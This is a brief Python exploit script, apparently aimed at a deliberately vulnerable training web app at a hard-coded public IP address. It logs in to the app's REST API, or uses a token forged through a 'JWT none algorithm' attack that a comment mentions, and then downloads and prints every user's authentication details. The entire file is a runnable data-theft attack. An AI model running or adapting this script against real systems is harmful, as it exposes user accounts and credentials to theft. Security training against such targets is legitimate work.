import json
import sys

import requests

s = requests.Session()

# Login with any user or forge a token with "JWT None Alg Attack.py"
r = s.post(
    'http://43.241.202.47:3003/rest/user/login',
    data=json.dumps({
        "email": 'example@example.com',
        "password": 'example',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Login:", r)
if r.status_code != 200:
    sys.exit()
s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})

# Download list of all users
r = s.get('http://43.241.202.47:3003/rest/user/authentication-details/')

if r.status_code == 200:
    print("All users in database:")
    for user in json.loads(r.text)['data']:
        print(user)
else:
    print("Failed to download users:", r.status_code)
